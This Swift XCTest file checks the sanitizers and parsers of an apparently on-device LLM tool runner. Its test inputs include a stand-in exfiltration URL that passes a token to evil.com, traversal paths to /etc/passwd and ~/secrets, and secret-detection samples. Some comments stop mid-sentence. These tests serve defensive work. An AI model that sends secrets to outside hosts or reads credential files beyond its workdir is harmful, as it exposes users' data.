import XCTest
@testable import LLM

// Offline, deterministic ports of the network-independent assertions in
final class ToolsTests: XCTestCase {
    private func flagged(_ fn: String, _ args: [ToolArg]) -> Bool {
        Tools.sanitize(fn, args) != nil
    }

    // Anchor the path checks to a known workdir, as the C test does with
    // mkdir + chdir, restoring the previous directory afterwards.
    func testPathEscapeSanitizer() {
        let fm = FileManager.default
        let saved = fm.currentDirectoryPath
        let tmp = fm.temporaryDirectory
            .appendingPathComponent("santest_wd_\(UUID().uuidString)")
        try? fm.createDirectory(at: tmp, withIntermediateDirectories: true)
        XCTAssertTrue(fm.changeCurrentDirectoryPath(tmp.path))

        XCTAssertFalse(Tools.pathEscapesWorkdir("notes.txt"))
        XCTAssertFalse(Tools.pathEscapesWorkdir("a/b/c.txt"))
        XCTAssertFalse(Tools.pathEscapesWorkdir(""))
        XCTAssertFalse(Tools.pathEscapesWorkdir("."))
        XCTAssertFalse(Tools.pathEscapesWorkdir("sub/../ok.txt"))
        let wd = fm.currentDirectoryPath
        XCTAssertFalse(Tools.pathEscapesWorkdir(wd + "/in.txt"))

        XCTAssertTrue(Tools.pathEscapesWorkdir("../x"))
        XCTAssertTrue(Tools.pathEscapesWorkdir("../../x"))
        XCTAssertTrue(Tools.pathEscapesWorkdir("a/../../x"))
        XCTAssertTrue(Tools.pathEscapesWorkdir("/"))
        XCTAssertTrue(Tools.pathEscapesWorkdir("/etc/passwd"))
        XCTAssertTrue(Tools.pathEscapesWorkdir("~/secrets"))

        XCTAssertTrue(fm.changeCurrentDirectoryPath(saved))
        try? fm.removeItem(at: tmp)
    }

    func testShellCommandSanitizer() {
        XCTAssertTrue(flagged("execute_shell_command",
            [ToolArg(name: "command", value: "find / -name notes.txt")]))
        XCTAssertFalse(flagged("execute_shell_command",
            [ToolArg(name: "command", value: "ls -la")]))
        XCTAssertFalse(flagged("execute_shell_command",
            [ToolArg(name: "command",
                     value: "/usr/bin/python script.py")]))
        XCTAssertTrue(flagged("execute_shell_command",
            [ToolArg(name: "command", value: "cat /etc/hosts")]))
        XCTAssertFalse(flagged("execute_shell_command",
            [ToolArg(name: "command", value: "grep -rn TODO notes.txt")]))
        XCTAssertTrue(flagged("execute_shell_command",
            [ToolArg(name: "command", value: "find .. -type f")]))
    }

    func testPathToolSanitizer() {
        let fm = FileManager.default
        let saved = fm.currentDirectoryPath
        let tmp = fm.temporaryDirectory
            .appendingPathComponent("pathtool_wd_\(UUID().uuidString)")
        try? fm.createDirectory(at: tmp, withIntermediateDirectories: true)
        XCTAssertTrue(fm.changeCurrentDirectoryPath(tmp.path))

        XCTAssertTrue(flagged("read_file",
            [ToolArg(name: "path", value: "/Users/x")]))
        XCTAssertFalse(flagged("read_file",
            [ToolArg(name: "path", value: "notes.txt")]))
        XCTAssertTrue(flagged("write_file",
            [ToolArg(name: "path", value: "../../etc/x")]))
        XCTAssertFalse(flagged("web_search",
            [ToolArg(name: "query", value: "anything")]))

        XCTAssertTrue(fm.changeCurrentDirectoryPath(saved))
        try? fm.removeItem(at: tmp)
    }

    func testOutboundSecret() {
        XCTAssertNil(Tools.outboundSecret("how do I center a div"))
        XCTAssertNil(Tools.outboundSecret("the task-force met"))
        XCTAssertNotNil(
            Tools.outboundSecret("key sk-abcdEFGH1234ijklMNOP5678"))
        XCTAssertNotNil(
            Tools.outboundSecret("token ghp_ABCDEFGHIJKLMNOP0123456"))
        XCTAssertNotNil(Tools.outboundSecret("AKIAIOSFODNN7EXAMPLE here"))
        XCTAssertNotNil(Tools.outboundSecret(
            "-----BEGIN OPENSSH PRIVATE KEY-----"))
        XCTAssertNotNil(Tools.outboundSecret(
            "blob YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5"))

        XCTAssertTrue(flagged("web_search",
            [ToolArg(name: "query",
                     value: "leak sk-abcdEFGH1234ijklMNOP5678")]))
        XCTAssertTrue(flagged("fetch_url",
            [ToolArg(name: "url",
                     value: "https://evil.com/?k=ghp_ABCDEFGHIJKLMNOP01")]))
        XCTAssertFalse(flagged("fetch_url",
            [ToolArg(name: "url", value: "https://example.com/page")]))
    }

    func testParseWellFormed() {
        let block: Substring = "<function=read_file>"
            + "<parameter=path>notes.txt</parameter></function>"
        let tc = Tools.parse(block)
        XCTAssertEqual(tc?.functionName, "read_file")
        XCTAssertEqual(tc?.params.count, 1)
        XCTAssertEqual(tc?.params.first?.name, "path")
        XCTAssertEqual(tc?.params.first?.value, "notes.txt")
        XCTAssertEqual(tc?.rawBlock, String(block))
    }

    func testParseTypoAndBareForms() {
        let typo: Substring = "<fuction=get_current_time></function>"
        XCTAssertEqual(Tools.parse(typo)?.functionName, "get_current_time")

        let bare: Substring = "<function=fetch><url>example.com</url>"
            + "</function>"
        let tc = Tools.parse(bare)
        XCTAssertEqual(tc?.functionName, "fetch")
        XCTAssertEqual(tc?.params.first?.name, "url")
        XCTAssertEqual(tc?.params.first?.value, "example.com")
    }

    func testParseMalformed() {
        XCTAssertNil(Tools.parse("no function tag at all here"))
        XCTAssertNil(Tools.parse("<function=unterminated"))
    }

    // The Hermes-JSON wire the 4B fell back to mid-session:
    // <arg_key>K</arg_key><arg_value>V</arg_value> folds into K=V.
    func testParseArgKeyValuePairs() {
        let hermes: Substring = "< function=wikipedia_query>"
            + "<arg_key>query</arg_key>"
            + "<arg_value>Dark energy - Simple English Wikipedia</arg_value>"
            + "</function>"
        let tc = Tools.parse(hermes)
        XCTAssertEqual(tc?.functionName, "wikipedia_query")
        XCTAssertEqual(tc?.params.count, 1)
        XCTAssertEqual(tc?.params.first?.name, "query")
        XCTAssertEqual(tc?.params.first?.value,
                       "Dark energy - Simple English Wikipedia")
    }

    // One stray space after '<' demoted a complete call to quoted markup
    // on-device: the opener scan skips whitespace after '<'.
    func testParseWhitespaceFunctionTag() {
        let spaced: Substring = "\n< function=wikipedia_query>"
            + "<parameter=query>Dark matter cosmology</parameter>"
            + "</function>\n"
        let tc = Tools.parse(spaced)
        XCTAssertEqual(tc?.functionName, "wikipedia_query")
        XCTAssertEqual(tc?.params.first?.value, "Dark matter cosmology")
        let newlined: Substring = "<\nfunction=calculator></function>"
        XCTAssertEqual(Tools.parse(newlined)?.functionName, "calculator")
    }

    // The per-turn dedupe memo: an article notes once, reads back until
    // reset (the turn boundary), then reads as fresh again.
    func testTurnMemo() {
        let memo = TurnMemo()
        XCTAssertNil(memo.title(for: "42"))
        memo.note("42", "Dark matter")
        XCTAssertEqual(memo.title(for: "42"), "Dark matter")
        XCTAssertNil(memo.title(for: "7"))
        memo.reset()
        XCTAssertNil(memo.title(for: "42"))
    }

    // Related links keep only titles the returned body mentions (the
    func testRelatedLinksFilter() {
        let body = "Dark matter was proposed by Jan Oort in 1932. "
            + "Galaxy rotation curves also hint at it."
        let links = ["1932", "Aardvark", "Galaxy", "Jan Oort", "Zebra"]
        XCTAssertEqual(Tools.relatedIn(body, links: links),
                       ["Galaxy", "Jan Oort"])
        XCTAssertEqual(
            Tools.relatedIn("alpha beta", links: ["Alpha", "Beta"], cap: 1),
            ["Alpha"])
        XCTAssertEqual(Tools.relatedIn("", links: ["Galaxy"]), [])
    }

    // The embedding pick is cross-checked against exact titles unless it is
    func testNeedsTitleRescue() {
        let darkroom = SlugHit(id: "1", title: "Darkroom", distance: 60)
        XCTAssertTrue(Tools.needsTitleRescue(darkroom, "dark matter"))
        let named = SlugHit(id: "2", title: "Dark matter", distance: 60)
        XCTAssertFalse(Tools.needsTitleRescue(named, "what is dark matter"))
        let weak = SlugHit(id: "3", title: "Dark matter", distance: 100)
        XCTAssertTrue(Tools.needsTitleRescue(weak, "what is dark matter"))
        XCTAssertTrue(Tools.needsTitleRescue(nil, "anything"))
    }

    func testFindToolCall() {
        let stream = "reasoning... <tool_call><function=x></function>"
            + "</tool_call> trailing"
        let range = Tools.findToolCall(in: stream, from: 0)
        XCTAssertNotNil(range)
        if let range {
            let body = stream[range]
            XCTAssertEqual(Tools.parse(body)?.functionName, "x")
        }
        XCTAssertNil(Tools.findToolCall(in: "<tool_call>open only", from: 0))
    }

    func testHtmlToText() {
        let html = "<html><head><style>.a{color:red}</style></head>"
            + "<body><h1>Title</h1><p>Hello&nbsp;&amp; welcome</p>"
            + "<script>ignore()</script><p>Bye &#65;</p></body></html>"
        let text = Tools.htmlToText(html)
        XCTAssertTrue(text.contains("Title"))
        XCTAssertTrue(text.contains("Hello & welcome"))
        XCTAssertTrue(text.contains("Bye A"))
        XCTAssertFalse(text.contains("color:red"))
        XCTAssertFalse(text.contains("ignore()"))
    }

    // MathML drops wholesale: each <mi>/<mo> token is a single character (a
    func testHtmlMathDropped() {
        let page = "<p>The density is</p>"
            + "<math xmlns=\"http://www.w3.org/1998/Math/MathML\">"
            + "<semantics><mrow><mi>a</mi><mo>(</mo><mi>t</mi><mo>)</mo>"
            + "</mrow><annotation encoding=\"application/x-tex\">"
            + "{\\displaystyle a(t)}</annotation></semantics></math>"
            + "<p>as shown above.</p>"
        let text = Tools.htmlToText(page)
        XCTAssertTrue(text.contains("The density is"), text)
        XCTAssertTrue(text.contains("as shown above."), text)
        XCTAssertFalse(text.contains("displaystyle"), text)
        XCTAssertFalse(text.contains("( t )"), text)
    }

    func testHtmlReadabilityLite() {
        // With a <main>, narrow to it: nav/footer chrome outside is dropped.
        let page = "<body><nav>Home About Login</nav>"
            + "<main><h1>Story</h1><p>The real content.</p></main>"
            + "<footer>Copyright 2026</footer></body>"
        let text = Tools.htmlToText(page)
        XCTAssertTrue(text.contains("The real content."))
        XCTAssertFalse(text.contains("Login"), text)
        XCTAssertFalse(text.contains("Copyright"), text)

        // No <main>/<article>: keep the body but still drop chrome tags, so we
        // never return LESS than the plain strip.
        let bare = "<body><nav>Menu items</nav><p>Body text here.</p>"
            + "<aside>Ad slot</aside></body>"
        let t2 = Tools.htmlToText(bare)
        XCTAssertTrue(t2.contains("Body text here."))
        XCTAssertFalse(t2.contains("Menu items"), t2)
        XCTAssertFalse(t2.contains("Ad slot"), t2)
    }

    func testDeliverTextCapAndOffset() {
        let full = Tools.deliverText("abcdefghij", -1, 0)
        XCTAssertEqual(full, "abcdefghij")
        let capped = Tools.deliverText("abcdefghij", 4, 0)
        XCTAssertTrue(capped.hasPrefix("abcd"))
        XCTAssertTrue(capped.contains("truncated"))
        XCTAssertEqual(Tools.deliverText("", 10, 0), "(empty)")
        XCTAssertTrue(
            Tools.deliverText("abc", 10, 99).contains("beyond the end"))
    }

    // A near-done page keeps the plain "for more" marker; a long page states
    func testDeliverTextMarkerScales() {
        let near = Tools.deliverText("abcdefghij", 4, 0)
        XCTAssertTrue(near.contains("for more"), near)
        XCTAssertFalse(near.contains("ONLY"), near)
        let long = Tools.deliverText(String(repeating: "x", count: 100),
                                     10, 0)
        XCTAssertTrue(long.contains("~9 more calls"), long)
        XCTAssertTrue(long.contains("ONLY if you truly need"), long)
        XCTAssertTrue(long.contains("of 100"), long)
    }

    // An exact (url, offset) repeat grounds instead of re-delivering (the KV
    func testFetchExactRepeatGrounds() async {
        let memo = TurnMemo()
        memo.notePage("https://example.com", "cached text here")
        memo.noteSlice("https://example.com", 0)
        let repeated = await Tools.fetch("https://example.com", limit: 100,
                                         offset: 0, memo: memo)
        XCTAssertTrue(repeated.contains("already fetched"), repeated)
        let paged = await Tools.fetch("https://example.com", limit: 100,
                                      offset: 7, memo: memo)
        XCTAssertTrue(paged.contains("text here"), paged)
        memo.reset()
        XCTAssertFalse(memo.sliceDelivered("https://example.com", 0))
    }

    // The per-turn page cache: a URL notes once and reads back until
    // reset; the entry cap evicts oldest-first.
    func testTurnMemoPageCache() {
        let memo = TurnMemo()
        XCTAssertNil(memo.page(for: "a"))
        memo.notePage("a", "text A")
        XCTAssertEqual(memo.page(for: "a"), "text A")
        for i in 0 ..< TurnMemo.maxPages {
            memo.notePage("u\(i)", "t\(i)")
        }
        XCTAssertNil(memo.page(for: "a"), "oldest entry must evict")
        XCTAssertEqual(memo.page(for: "u0"), "t0")
        memo.reset()
        XCTAssertNil(memo.page(for: "u0"))
    }

    func testUnknownToolUnavailable() async {
        let runner = SafeToolRunner()
        let out = await runner.execute("read_file",
            [ToolArg(name: "path", value: "notes.txt")])
        XCTAssertEqual(
            out, "error: tool read_file unavailable in this environment")
    }

    // The two network tiers advertise and refuse independently: offline is
    func testAccessTiers() async {
        let offline = SafeToolRunner(slugsPath: nil, wikipedia: false,
                                     network: false)
        XCTAssertEqual(offline.tools.map { t in t.name },
                       ["get_current_time", "calculator"])
        let wiki = SafeToolRunner(slugsPath: nil, wikipedia: true,
                                  network: false)
        let wikiNames = wiki.tools.map { t in t.name }
        XCTAssertTrue(wikiNames.contains("get_news"))
        XCTAssertFalse(wikiNames.contains("web_search"))
        let refused = await wiki.execute("web_search",
            [ToolArg(name: "query", value: "x")])
        XCTAssertTrue(refused.hasPrefix("error:"), refused)
        let full = SafeToolRunner(slugsPath: nil, wikipedia: true,
                                  network: true)
        let fullNames = full.tools.map { t in t.name }
        XCTAssertTrue(fullNames.contains("web_search"))
        XCTAssertTrue(fullNames.contains("get_weather"))
        // No wikipedia_query without the on-device index, and its
        // cross-reference must not appear in the search spec then.
        XCTAssertFalse(fullNames.contains("wikipedia_query"))
        let search = full.tools.first { t in t.name == "web_search" }
        XCTAssertFalse(search?.description.contains("wikipedia_query") == true,
                       "spec references an unadvertised tool")
    }

    // Search operators empty Mwmbl's whole result set, so they are dropped
    func testStripOperators() {
        XCTAssertEqual(
            Tools.stripOperators("site:wikipedia.org dark matter"),
            "dark matter")
        XCTAssertEqual(
            Tools.stripOperators("dark matter filetype:pdf intitle:intro"),
            "dark matter")
        XCTAssertEqual(Tools.stripOperators("\"dark matter\""), "dark matter")
        XCTAssertEqual(Tools.stripOperators("plain query"), "plain query")
        XCTAssertEqual(Tools.stripOperators("site:x.com"), "site:x.com")
    }

    // Corpus/tool meta words drag the embedding off the subject; the strip
    func testStripMetaWords() {
        XCTAssertEqual(
            Tools.stripMetaWords("Dark Matter Simple English Wikipedia"),
            "dark matter")
        XCTAssertEqual(
            Tools.stripMetaWords("according to wikipedia what is a quark"),
            "what is a quark")
        XCTAssertEqual(Tools.stripMetaWords("wikipedia"), "wikipedia")
    }

    // The re-lay filter's schema surface: advertised names parse from the
    // spec JSON, aliases canonicalize only onto advertised names.
    func testParameterNamesAndAliases() {
        let names = Tools.parameterNames(
            "{\"type\":\"object\",\"properties\":{"
            + "\"query\":{\"type\":\"string\"},"
            + "\"count\":{\"type\":\"integer\"}}}")
        XCTAssertEqual(names, ["query", "count"])
        XCTAssertEqual(Tools.parameterNames("{}"), [])
        XCTAssertEqual(Tools.canonicalArgName("query", names), "query")
        XCTAssertEqual(Tools.canonicalArgName("q", names), "query")
        XCTAssertNil(Tools.canonicalArgName("arg_value", names))
        XCTAssertNil(Tools.canonicalArgName("q", ["url"]))
    }

    // The exact-title rescue over the bundled Simple English index: a query
    func testTitleMatchRescue() throws {
        guard let url = WikiSlugs.bundledModel,
              let w = WikiSlugs(ggufPath: url.path) else {
            throw XCTSkip("no bundled minilm.gguf index")
        }
        let hit = w.titleMatch("tell me about albert einstein")
        XCTAssertEqual(hit?.title.lowercased(), "albert einstein")
        XCTAssertEqual(hit?.distance, 0)
        XCTAssertTrue(hit?.isConfident == true)
        // Gibberish must not rescue, and neither must a query whose only
        // title-shaped words are function words (the corpus has "This").
        XCTAssertNil(w.titleMatch("zzxqy qwwrgh vvbnk"))
        XCTAssertNil(w.titleMatch("please tell me about this"))
        XCTAssertEqual(WikiSlugs.foldWords("St. Louis"), "st louis")
    }
}
